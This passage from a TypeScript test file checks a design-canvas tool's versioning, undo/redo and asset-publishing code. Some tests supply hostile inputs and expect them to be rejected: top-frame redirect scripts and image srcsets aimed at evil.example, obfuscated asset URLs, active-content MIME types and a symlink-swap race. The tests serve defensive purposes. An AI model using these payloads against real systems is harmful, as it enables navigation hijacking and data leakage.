      selectedVersionModel: null,
      selectedVersionAssetPins: [],
      assetId: `asset-${"a".repeat(32)}`,
      assetChecksum: "a".repeat(64),
      assetBytes: MAX_DESIGN_CONTEXT_BYTES + 1,
      assetPath: `.context/assets/asset-${"a".repeat(32)}/original.bin`,
      assetBundleFiles: [],
    }],
  }), /bounded payload budget/i);
});

test("removing a Node with an active scoped Agent Job is rejected", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-active-remove-"));
  const projectId = "project-active-remove";
  try {
    await initializeDesignProject(dataDir, projectId);
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
    });
    await createDesignJob(dataDir, projectId, {
      kind: "node-generation",
      ...FIXTURE_JOB_IDENTITY,
      nodeId: "node-page",
    });
    const current = await getDesignCanvas(dataDir, projectId);
    await assert.rejects(mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: current.revision,
      intents: [{ type: "remove-node", nodeId: "node-page" }],
    }), /cancel.*active|active.*Job/i);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("undo and redo refuse to remove or revive an active-Job Node without consuming history", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-active-history-"));
  const projectId = "project-active-history";
  try {
    await initializeDesignProject(dataDir, projectId);
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
    });
    const active = await createDesignJob(dataDir, projectId, {
      kind: "node-generation",
      ...FIXTURE_JOB_IDENTITY,
      nodeId: "node-page",
    });
    const beforeUndo = await getDesignCanvas(dataDir, projectId);
    await assert.rejects(
      undoDesignCanvas(dataDir, projectId, beforeUndo.revision),
      /Cancel active scoped Agent Jobs/i,
    );
    const afterUndo = await getDesignCanvas(dataDir, projectId);
    assert.equal(afterUndo.revision, beforeUndo.revision);
    assert.equal(afterUndo.undoDepth, beforeUndo.undoDepth);
    assert.equal(afterUndo.redoDepth, beforeUndo.redoDepth);
    assert.equal(afterUndo.nodes[0]?.activeJobId, active.job.id);

    await updateDesignJob(dataDir, projectId, active.job.id, { status: "cancelled" });
    const projectPath = join(dataDir, "projects", projectId, "design", "project.json");
    const project = JSON.parse(await readFile(projectPath, "utf8"));
    project.nodes[0].activeJobId = null;
    project.nodes[0].state = "cancelled";
    await writeFile(projectPath, `${JSON.stringify(project)}\n`);
    const removed = await undoDesignCanvas(dataDir, projectId, project.revision);
    assert.deepEqual(removed.nodes, []);

    const withStaleRedo = JSON.parse(await readFile(projectPath, "utf8"));
    withStaleRedo.redo.at(-1).nodes[0].activeJobId = active.job.id;
    await writeFile(projectPath, `${JSON.stringify(withStaleRedo)}\n`);
    const beforeRedo = await getDesignCanvas(dataDir, projectId);
    await assert.rejects(
      redoDesignCanvas(dataDir, projectId, beforeRedo.revision),
      /Cancel active scoped Agent Jobs/i,
    );
    const afterRedo = await getDesignCanvas(dataDir, projectId);
    assert.equal(afterRedo.revision, beforeRedo.revision);
    assert.equal(afterRedo.undoDepth, beforeRedo.undoDepth);
    assert.equal(afterRedo.redoDepth, beforeRedo.redoDepth);
    assert.deepEqual(afterRedo.nodes, []);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("a removed Node identity cannot be explicitly reused for a new Node", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-retired-node-"));
  const projectId = "project-retired-node";
  try {
    await initializeDesignProject(dataDir, projectId);
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
    });
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 1,
      intents: [{ type: "remove-node", nodeId: "node-page" }],
    });
    await assert.rejects(mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 2,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "component" } }],
    }), /retired|already exists/i);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("undoing an added generated Node permanently retires its immutable namespace", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-undo-retired-node-"));
  const projectId = "project-undo-retired-node";
  try {
    await initializeDesignProject(dataDir, projectId);
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
    });
    const published = await publishDesignVersion(dataDir, projectId, {
      nodeId: "node-page",
      html: "<!doctype html><html><head></head><body>immutable namespace</body></html>",
      contextHash: "a".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: null,
      jobId: null,
      runnerId: "fixture",
      model: null,
    });
    const undone = await undoDesignCanvas(
      dataDir,
      projectId,
      (await getDesignCanvas(dataDir, projectId)).revision,
    );
    assert.deepEqual(undone.nodes, []);
    const edited = await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: undone.revision,
      intents: [{ type: "add-node", node: { id: "node-other", kind: "component" } }],
    });
    await assert.rejects(mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: edited.revision,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "component" } }],
    }), /retired|already exists/i);
    assert.deepEqual(
      (await listDesignVersions(dataDir, projectId, "node-page")).map((version) => version.id),
      [published.manifest.id],
    );
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("undoing a move after a newer publish preserves the immutable Node head", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-head-history-"));
  const projectId = "project-head-history";
  try {
    await initializeDesignProject(dataDir, projectId);
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
    });
    const first = await publishDesignVersion(dataDir, projectId, {
      nodeId: "node-page",
      html: "<!doctype html><html><head></head><body>v1</body></html>",
      contextHash: "a".repeat(64), canvasRevision: 1, expectedHeadVersionId: null,
      jobId: null, runnerId: "fixture", model: null,
    });
    const beforeMove = await getDesignCanvas(dataDir, projectId);
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: beforeMove.revision,
      intents: [{ type: "update-node", nodeId: "node-page", patch: { geometry: { x: 600 } } }],
    });
    const second = await publishDesignVersion(dataDir, projectId, {
      nodeId: "node-page",
      html: "<!doctype html><html><head></head><body>v2</body></html>",
      contextHash: "b".repeat(64), canvasRevision: beforeMove.revision + 1,
      expectedHeadVersionId: first.manifest.id, jobId: null, runnerId: "fixture", model: null,
    });
    const undone = await undoDesignCanvas(dataDir, projectId, (await getDesignCanvas(dataDir, projectId)).revision);
    assert.equal(undone.nodes[0]?.geometry.x, 0);
    assert.equal(undone.nodes[0]?.currentVersionId, second.manifest.id);
    assert.equal(undone.nodes[0]?.selectedVersionId, second.manifest.id);
    assert.equal(undone.nodes[0]?.versionCount, 2);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("ordinary selected-Version changes remain undoable when the generation head is unchanged", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-version-selection-history-"));
  const projectId = "project-version-selection-history";
  try {
    await initializeDesignProject(dataDir, projectId);
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
    });
    const first = await publishDesignVersion(dataDir, projectId, {
      nodeId: "node-page",
      html: "<!doctype html><html><head></head><body>v1</body></html>",
      contextHash: "a".repeat(64), canvasRevision: 1, expectedHeadVersionId: null,
      jobId: null, runnerId: "fixture", model: null,
    });
    const second = await publishDesignVersion(dataDir, projectId, {
      nodeId: "node-page",
      html: "<!doctype html><html><head></head><body>v2</body></html>",
      contextHash: "b".repeat(64), canvasRevision: 2, expectedHeadVersionId: first.manifest.id,
      jobId: null, runnerId: "fixture", model: null,
    });
    const beforeSelection = await getDesignCanvas(dataDir, projectId);
    const selectedOld = await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: beforeSelection.revision,
      intents: [{ type: "update-node", nodeId: "node-page", patch: { selectedVersionId: first.manifest.id } }],
    });
    assert.equal(selectedOld.nodes[0]?.selectedVersionId, first.manifest.id);

    const undone = await undoDesignCanvas(dataDir, projectId, selectedOld.revision);
    assert.equal(undone.nodes[0]?.currentVersionId, second.manifest.id);
    assert.equal(undone.nodes[0]?.selectedVersionId, second.manifest.id);
    const redone = await redoDesignCanvas(dataDir, projectId, undone.revision);
    assert.equal(redone.nodes[0]?.currentVersionId, second.manifest.id);
    assert.equal(redone.nodes[0]?.selectedVersionId, first.manifest.id);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("undo and redo restore ordinary canvas snapshots behind the same revision CAS", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-history-"));
  const projectId = "project-history";
  try {
    await initializeDesignProject(dataDir, projectId);
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [
        { type: "add-node", node: { id: "node-card", kind: "component" } },
        { type: "add-node", node: { id: "node-detail", kind: "page", geometry: { x: 1200, y: 0 } } },
      ],
    });
    const moved = await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 1,
      intents: [
        { type: "update-node", nodeId: "node-card", patch: { geometry: { x: 800, y: 400 } } },
        {
          type: "connect-nodes",
          connection: { id: "flow-card-detail", sourceNodeId: "node-card", targetNodeId: "node-detail", label: "Open" },
        },
      ],
    });
    assert.equal(moved.nodes[0]?.geometry.x, 800);
    assert.deepEqual(moved.connections, [{
      id: "flow-card-detail",
      sourceNodeId: "node-card",
      targetNodeId: "node-detail",
      label: "Open",
    }]);

    const undone = await undoDesignCanvas(dataDir, projectId, 2);
    assert.equal(undone.revision, 3);
    assert.equal(undone.nodes[0]?.geometry.x, 0);
    assert.deepEqual(undone.connections, []);
    assert.equal(undone.redoDepth, 1);

    const redone = await redoDesignCanvas(dataDir, projectId, 3);
    assert.equal(redone.revision, 4);
    assert.equal(redone.nodes[0]?.geometry.x, 800);
    assert.deepEqual(redone.connections, moved.connections);
    await assert.rejects(undoDesignCanvas(dataDir, projectId, 3), DesignRevisionConflictError);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("single-HTML Node versions publish immutably and late head-CAS results become superseded", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-versions-"));
  const projectId = "project-versions";
  try {
    await initializeDesignProject(dataDir, projectId);
    const asset = await storeDesignAsset(dataDir, projectId, {
      name: "photo.png",
      mimeType: "image/png",
      base64: Buffer.concat([
        Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
        Buffer.from("photo bytes"),
      ]).toString("base64"),
    });
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-home", kind: "page", name: "Home" } }],
    });

    const first = await publishDesignVersion(dataDir, projectId, {
      nodeId: "node-home",
      html: `<!doctype html><html><head><style>body{margin:0}</style></head><body><img src="dezin-asset://${asset.id}"><script>document.body.dataset.ready='yes'</script></body></html>`,
      contextHash: "a".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: null,
      jobId: null,
      runnerId: "fake",
      model: null,
    }, 300);
    assert.equal(first.manifest.publicationStatus, "published");
    assert.deepEqual(first.manifest.assetPins, [{ assetId: asset.id, checksum: asset.checksum }]);
    const firstFile = await resolveDesignVersionFile(dataDir, projectId, "node-home", first.manifest.id, "index.html");
    const servedHtml = await readFile(firstFile.path, "utf8");
    assert.match(servedHtml, new RegExp(`versionId=${first.manifest.id}`));
    assert.match(servedHtml, new RegExp(`checksum=${asset.checksum}`));

    const second = await publishDesignVersion(dataDir, projectId, {
      nodeId: "node-home",
      html: servedHtml.replace(
        "</body>",
        "<p>second version preserves its pinned image</p></body>",
      ),
      contextHash: "b".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: first.manifest.id,
      jobId: null,
      runnerId: "fake",
      model: null,
    });
    assert.deepEqual(second.manifest.assetPins, [{ assetId: asset.id, checksum: asset.checksum }]);
    const secondFile = await resolveDesignVersionFile(dataDir, projectId, "node-home", second.manifest.id, "index.html");
    const secondHtml = await readFile(secondFile.path, "utf8");
    assert.match(secondHtml, new RegExp(`versionId=${second.manifest.id}`));
    assert.doesNotMatch(secondHtml, new RegExp(`versionId=${first.manifest.id}`));

    await assert.rejects(publishDesignVersion(dataDir, projectId, {
      nodeId: "node-home",
      html: servedHtml,
      contextHash: "e".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: second.manifest.id,
      jobId: null,
      runnerId: "fake",
      model: null,
    }), /not authorized by its expected Head Version/i);
    await assert.rejects(publishDesignVersion(dataDir, projectId, {
      nodeId: "node-home",
      html: secondHtml.replace(`/api/projects/${projectId}/`, "/api/projects/project-other/"),
      contextHash: "f".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: second.manifest.id,
      jobId: null,
      runnerId: "fake",
      model: null,
    }), /not authorized by its expected Head Version/i);
    const late = await publishDesignVersion(dataDir, projectId, {
      nodeId: "node-home",
      html: "<!doctype html><html><head><style>body{color:red}</style></head><body>late</body></html>",
      contextHash: "c".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: first.manifest.id,
      jobId: null,
      runnerId: "fake",
      model: null,
    });
    assert.equal(late.manifest.publicationStatus, "superseded");
    const canvas = await getDesignCanvas(dataDir, projectId);
    assert.equal(canvas.nodes[0]?.currentVersionId, second.manifest.id);
    assert.equal(canvas.nodes[0]?.selectedVersionId, second.manifest.id);
    assert.equal((await listDesignVersions(dataDir, projectId, "node-home")).length, 3);
    assert.equal((await getDesignVersion(dataDir, projectId, "node-home", late.manifest.id)).publicationStatus, "superseded");

    await assert.rejects(
      publishDesignVersion(dataDir, projectId, {
        nodeId: "node-home",
        html: "<!doctype html><html><head></head><body><script>window.top.location='https://evil.example'</script></body></html>",
        contextHash: "d".repeat(64),
        canvasRevision: 1,
        expectedHeadVersionId: second.manifest.id,
        jobId: null,
        runnerId: "fake",
        model: null,
      }),
      /parent|top|navigation/i,
    );
    await assert.rejects(
      publishDesignVersion(dataDir, projectId, {
        nodeId: "node-home",
        html: "<!doctype html><html><head></head><body><img src=\"/api/settings\"></body></html>",
        contextHash: "f".repeat(64),
        canvasRevision: 1,
        expectedHeadVersionId: second.manifest.id,
        jobId: null,
        runnerId: "fake",
        model: null,
      }),
      /unpinned|external URL/i,
    );
    await assert.rejects(
      publishDesignVersion(dataDir, projectId, {
        nodeId: "node-home",
        html: "<!doctype html><html><head></head><body><img srcset=\"https://evil.example/a.png 1x, https://evil.example/b.png 2x\"></body></html>",
        contextHash: "f".repeat(64),
        canvasRevision: 1,
        expectedHeadVersionId: second.manifest.id,
        jobId: null,
        runnerId: "fake",
        model: null,
      }),
      /responsive-image|external/i,
    );
    assert.equal((await getDesignCanvas(dataDir, projectId)).nodes[0]?.currentVersionId, second.manifest.id);

    const selectedOld = await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: (await getDesignCanvas(dataDir, projectId)).revision,
      intents: [{ type: "update-node", nodeId: "node-home", patch: { selectedVersionId: first.manifest.id } }],
    });
    const third = await publishDesignVersion(dataDir, projectId, {
      nodeId: "node-home",
      html: "<!doctype html><html><head><style>body{color:green}</style></head><body>third</body></html>",
      contextHash: "e".repeat(64),
      canvasRevision: selectedOld.revision,
      expectedHeadVersionId: second.manifest.id,
      jobId: null,
      runnerId: "fake",
      model: null,
    });
    const selectedCanvas = await getDesignCanvas(dataDir, projectId);
    assert.equal(selectedCanvas.nodes[0]?.currentVersionId, third.manifest.id);
    assert.equal(selectedCanvas.nodes[0]?.selectedVersionId, first.manifest.id);

    await assert.rejects(
      mutateDesignCanvas(dataDir, projectId, {
        expectedRevision: selectedCanvas.revision,
        intents: [{ type: "update-node", nodeId: "node-home", patch: { selectedVersionId: "version-missing" } }],
      }),
      /unavailable|missing/i,
    );

    const undoneAfterPublish = await undoDesignCanvas(
      dataDir,
      projectId,
      (await getDesignCanvas(dataDir, projectId)).revision,
    );
    assert.equal(undoneAfterPublish.nodes[0]?.currentVersionId, third.manifest.id);
    assert.equal(
      (await resolveDesignVersionFile(dataDir, projectId, "node-home", third.manifest.id, "index.html")).manifest.id,
      third.manifest.id,
    );

    await writeFile(firstFile.path, "<!doctype html><html><head></head><body>tampered</body></html>");
    await assert.rejects(
      resolveDesignVersionFile(dataDir, projectId, "node-home", first.manifest.id, "index.html"),
      /checksum|invalid/i,
    );
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("publication semantically pins entity-encoded Assets for portable roundtrip", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-semantic-asset-publication-"));
  const projectId = "project-semantic-asset-publication";
  try {
    await initializeDesignProject(dataDir, projectId);
    const imageBytes = Buffer.concat([
      Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
      Buffer.from("semantic publication pixel", "utf8"),
    ]);
    const asset = await storeDesignAsset(dataDir, projectId, {
      name: "semantic.png",
      mimeType: "image/png",
      base64: imageBytes.toString("base64"),
    });
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
    });
    const entityAsset = `dezin-asset:&#47;&#47;${asset.id}`;
    const cssEscapedAsset = `dezin-asset:\\2f \\2f ${asset.id}`;

    const published = await publishDesignVersion(dataDir, projectId, {
      nodeId: "node-page",
      html: `<!doctype html><html><head><style>.hero{background-image:url("${cssEscapedAsset}")}</style></head><body>
        <img src="${entityAsset}" srcset="dezin-asset://${asset.id} 1x, ${entityAsset} 2x">
        <a href="${entityAsset}" ping="dezin-asset://${asset.id} ${entityAsset}">asset</a>
        <div class="hero" style="background-image:url('${cssEscapedAsset}')"></div>
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
          <image href="${entityAsset}" width="10" height="10" />
          <image xlink:href="${entityAsset}" width="10" height="10" />
          <rect fill="url('${cssEscapedAsset}')" width="10" height="10" />
        </svg>
      </body></html>`,
      contextHash: "a".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: null,
      jobId: null,
      runnerId: "fixture",
      model: null,
    });

    assert.deepEqual(published.manifest.assetPins, [{ assetId: asset.id, checksum: asset.checksum }]);
    const portable = await buildPortableDesignVersionHtml(
      dataDir,
      projectId,
      "node-page",
      published.manifest.id,
    );
    assert.match(portable.html.toString("utf8"), new RegExp(`data:image/png;base64,${imageBytes.toString("base64")}`));
    assert.doesNotMatch(portable.html.toString("utf8"), /dezin-asset:|\/api\/projects\//i);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("publication rebinds authorized semantic Head URLs and preserves exact JavaScript Asset sinks", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-semantic-head-publication-"));
  const projectId = "project-semantic-head-publication";
  try {
    await initializeDesignProject(dataDir, projectId);
    const imageBytes = Buffer.concat([
      Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
      Buffer.from("script sink pixel", "utf8"),
    ]);
    const asset = await storeDesignAsset(dataDir, projectId, {
      name: "script.png",
      mimeType: "image/png",
      base64: imageBytes.toString("base64"),
    });
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
    });
    const first = await publishDesignVersion(dataDir, projectId, {
      nodeId: "node-page",
      html: `<!doctype html><html><head></head><body><script>
        const image = document.createElement("img");
        const assetUrl = "dezin-asset://${asset.id}";
        const background = "url(dezin-asset://${asset.id})";
        image.src = assetUrl;
        image.style.backgroundImage = background;
        document.body.append(image);
      </script></body></html>`,
      contextHash: "a".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: null,
      jobId: null,
      runnerId: "fixture",
      model: null,
    });
    assert.deepEqual(first.manifest.assetPins, [{ assetId: asset.id, checksum: asset.checksum }]);
    const firstFile = await resolveDesignVersionFile(dataDir, projectId, "node-page", first.manifest.id, "index.html");
    const firstHtml = await readFile(firstFile.path, "utf8");
    assert.doesNotMatch(firstHtml, /dezin-asset:/i);
    assert.match(firstHtml, new RegExp(`versionId=${first.manifest.id}`));
    const firstPortable = await buildPortableDesignVersionHtml(
      dataDir,
      projectId,
      "node-page",
      first.manifest.id,
    );
    assert.match(firstPortable.html.toString("utf8"), new RegExp(`data:image/png;base64,${imageBytes.toString("base64")}`));
    assert.doesNotMatch(firstPortable.html.toString("utf8"), /dezin-asset:|\/api\/projects\//i);

    const headUrl = `/api/projects/${projectId}/design-canvas/assets/${asset.id}/${asset.fileName}`
      + `?nodeId=node-page&versionId=${first.manifest.id}&checksum=${asset.checksum}`;
    const encodedHeadUrl = headUrl.replaceAll("&", "&#38;").replaceAll("/", "&#47;");
    const second = await publishDesignVersion(dataDir, projectId, {
      nodeId: "node-page",
      html: `<!doctype html><html><head><style>.hero{background:url("${headUrl.replaceAll("/", "\\2f ")}")}</style></head><body>
        <img src="${encodedHeadUrl}">
        <script>const image = document.createElement("img"); image.src = \`${headUrl}\`;</script>
      </body></html>`,
      contextHash: "b".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: first.manifest.id,
      jobId: null,
      runnerId: "fixture",
      model: null,
    });
    assert.deepEqual(second.manifest.assetPins, [{ assetId: asset.id, checksum: asset.checksum }]);
    const secondFile = await resolveDesignVersionFile(dataDir, projectId, "node-page", second.manifest.id, "index.html");
    const secondHtml = await readFile(secondFile.path, "utf8");
    assert.match(secondHtml, new RegExp(`versionId=${second.manifest.id}`));
    assert.doesNotMatch(secondHtml, new RegExp(`versionId=${first.manifest.id}`));
    const secondPortable = await buildPortableDesignVersionHtml(
      dataDir,
      projectId,
      "node-page",
      second.manifest.id,
    );
    assert.match(secondPortable.html.toString("utf8"), /data:image\/png;base64,/);
    assert.doesNotMatch(secondPortable.html.toString("utf8"), /dezin-asset:|\/api\/projects\//i);

    const third = await publishDesignVersion(dataDir, projectId, {
      nodeId: "node-page",
      html: `<!doctype html><html><head></head><body><script>
        const image = document.createElement("img");
        image.src = "dezin-asset://${asset.id}";
      </script></body></html>`,
      contextHash: "d".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: second.manifest.id,
      jobId: null,
      runnerId: "fixture",
      model: null,
    });
    const thirdPortable = await buildPortableDesignVersionHtml(
      dataDir,
      projectId,
      "node-page",
      third.manifest.id,
    );
    assert.match(thirdPortable.html.toString("utf8"), /data:image\/png;base64,/);
    assert.doesNotMatch(thirdPortable.html.toString("utf8"), /dezin-asset:|\/api\/projects\//i);

    await assert.rejects(publishDesignVersion(dataDir, projectId, {
      nodeId: "node-page",
      html: `<!doctype html><html><head></head><body><img src="${encodedHeadUrl.replace(asset.checksum, "0".repeat(64))}"></body></html>`,
      contextHash: "c".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: third.manifest.id,
      jobId: null,
      runnerId: "fixture",
      model: null,
    }), /not authorized by its expected Head Version/i);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("publication fails closed for JavaScript Asset sinks without an exact source token", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-js-asset-authority-"));
  const projectId = "project-js-asset-authority";
  try {
    await initializeDesignProject(dataDir, projectId);
    const asset = await storeDesignAsset(dataDir, projectId, {
      name: "script.png",
      mimeType: "image/png",
      base64: Buffer.concat([
        Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
        Buffer.from("semantic script pixel", "utf8"),
      ]).toString("base64"),
    });
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
    });
    const scripts = [
      `const image = document.createElement("img"); image.src = "dezin" + "-asset://${asset.id}";`,
      `const image = document.createElement("img"); image.src = "dezin\\x2dasset://${asset.id}";`,
      `/* dezin-asset://${asset.id} */ const image = document.createElement("img"); image.src = "dezin\\x2dasset://${asset.id}";`,
      `const decoy = "dezin-asset://${asset.id}"; const image = document.createElement("img"); image.src = "dezin" + "-asset://${asset.id}"; void decoy;`,
      `const decoy = "dezin-asset://${asset.id}"; const image = document.createElement("img"); image.src = "dezin\\x2dasset://${asset.id}"; void decoy;`,
      `const exact = document.createElement("img"); exact.src = "dezin-asset://${asset.id}"; const split = document.createElement("img"); split.src = "dezin" + "-asset://${asset.id}";`,
      `const exact = document.createElement("img"); exact.src = "dezin-asset://${asset.id}"; const escaped = document.createElement("img"); escaped.src = "dezin\\x2dasset://${asset.id}";`,
      `const image = document.createElement("img"); image.style.backgroundImage = "url(dezin" + "-asset://${asset.id})";`,
      `const image = document.createElement("img"); const id = "${asset.id}"; image.src = \`dezin-asset://\${id}\`;`,
    ];
    for (const [index, script] of scripts.entries()) {
      await assert.rejects(publishDesignVersion(dataDir, projectId, {
        nodeId: "node-page",
        html: `<!doctype html><html><head></head><body><script>${script}</script></body></html>`,
        contextHash: String(index).padStart(64, "a"),
        canvasRevision: 1,
        expectedHeadVersionId: null,
        jobId: null,
        runnerId: "fixture",
        model: null,
      }), /JavaScript Asset URL.*exact source|cannot.*canonical|remote scripts or resources/i);
    }
    await assert.rejects(publishDesignVersion(dataDir, projectId, {
      nodeId: "node-page",
      html: `<!doctype html><html><head></head><body><script>
        const image = document.createElement("img");
        image.src = "dezin-asset://asset-${"f".repeat(32)}";
      </script></body></html>`,
      contextHash: "f".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: null,
      jobId: null,
      runnerId: "fixture",
      model: null,
    }), /not found|unavailable|missing/i);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("portable Version export rejects active-content Asset MIME types", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-portable-active-mime-"));
  const projectId = "project-portable-active-mime";
  try {
    await initializeDesignProject(dataDir, projectId);
    const asset = await storeDesignAsset(dataDir, projectId, {
      name: "active.html",
      mimeType: "text/html",
      base64: Buffer.from("<!doctype html><title>active</title>", "utf8").toString("base64"),
    });
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
    });
    const published = await publishDesignVersion(dataDir, projectId, {
      nodeId: "node-page",
      html: `<!doctype html><html><head></head><body><img src="dezin-asset://${asset.id}"></body></html>`,
      contextHash: "a".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: null,
      jobId: null,
      runnerId: "fixture",
      model: null,
    });

    await assert.rejects(
      buildPortableDesignVersionHtml(dataDir, projectId, "node-page", published.manifest.id),
      /active|unsafe|portable.*mime|media type/i,
    );
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("portable Version export rejects its projected base64 budget before reading any Asset payload", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-portable-budget-"));
  const projectId = "project-portable-budget";
  try {
    await initializeDesignProject(dataDir, projectId);
    const asset = await storeDesignAsset(dataDir, projectId, {
      name: "photo.png",
      mimeType: "image/png",
      base64: Buffer.concat([
        Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
        Buffer.from("small-payload", "utf8"),
      ]).toString("base64"),
    });
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
    });
    const references = Array.from(
      { length: 10 },
      (_, index) => `<img alt="${index}" src="dezin-asset://${asset.id}">`,
    ).join("");
    const published = await publishDesignVersion(dataDir, projectId, {
      nodeId: "node-page",
      html: `<!doctype html><html><head></head><body>${references}</body></html>`,
      contextHash: "a".repeat(64),
      canvasRevision: 1,
      expectedHeadVersionId: null,
      jobId: null,
      runnerId: "fixture",
      model: null,
    });
    const assetManifestPath = join(
      dataDir,
      "projects",
      projectId,
      "design",
      "assets",
      asset.id,
      "manifest.json",
    );
    const storedAsset = JSON.parse(await readFile(assetManifestPath, "utf8")) as { bytes: number };
    storedAsset.bytes = MAX_DESIGN_ASSET_BYTES;
    await writeFile(assetManifestPath, `${JSON.stringify(storedAsset, null, 2)}\n`);
    let payloadReads = 0;

    await assert.rejects(
      buildPortableDesignVersionHtml(
        dataDir,
        projectId,
        "node-page",
        published.manifest.id,
        { beforeAssetPayloadRead: () => { payloadReads += 1; } },
      ),
      /single-file export limit/i,
    );
    assert.equal(payloadReads, 0);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("portable Version export rejects same-byte path substitution before reading Version and Asset payloads", async (t) => {
  await t.test("Version HTML", async () => {
    const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-portable-version-toctou-"));
    const projectId = "project-portable-version-toctou";
    try {
      await initializeDesignProject(dataDir, projectId);
      await mutateDesignCanvas(dataDir, projectId, {
        expectedRevision: 0,
        intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
      });
      const published = await publishDesignVersion(dataDir, projectId, {
        nodeId: "node-page",
        html: "<!doctype html><html><head><title>Portable race</title></head><body><main>Portable race</main></body></html>",
        contextHash: "d".repeat(64),
        canvasRevision: 1,
        expectedHeadVersionId: null,
        jobId: null,
        runnerId: "fixture",
        model: null,
      });
      const version = await resolveDesignVersionFile(
        dataDir,
        projectId,
        "node-page",
        published.manifest.id,
        "index.html",
      );
      const replacement = join(dataDir, "same-version.html");
      await writeFile(replacement, await readFile(version.path));
      let substituted = false;

      await assert.rejects(buildPortableDesignVersionHtml(
        dataDir,
        projectId,
        "node-page",
        published.manifest.id,
        {
          beforeVersionPayloadRead: async () => {
            substituted = true;
            await rm(version.path, { force: true });
            await symlink(replacement, version.path);
          },
        },
